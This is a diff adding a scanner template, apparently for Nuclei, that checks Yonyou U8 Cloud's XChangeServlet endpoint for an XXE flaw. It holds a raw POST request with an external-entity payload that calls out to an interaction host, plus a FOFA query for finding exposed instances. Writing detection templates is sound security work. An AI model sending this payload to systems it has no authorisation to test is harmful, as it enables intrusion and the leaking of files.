@@ -1,0 +1,30 @@
+id: yongyouU8-Cloud_XChangeServlet-XXE
+info:
+  tags: yongyouU8-Cloud_XChangeServlet-XXE
+  name: 用友U8 Cloud XChangeServlet XXE漏洞
+  author: xc
+  severity: high
+  description: |-
+    fofa：app="用友-U8-Cloud"
+    用友U8 Cloud  XChangeServlet接口处存在XXE漏洞，攻击者可通过该漏洞获取敏感文件信息，攻击者添加恶意内容，通过易受攻击的代码，就能够攻击包含缺陷的XML处理器。
+
+http:
+  - raw:
+      - |
+        POST /service/XChangeServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "http://{{interactsh-url}}">]><r><a>&xxe;</a ></r>
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+        - "dns"
+
+
+
+
+
+
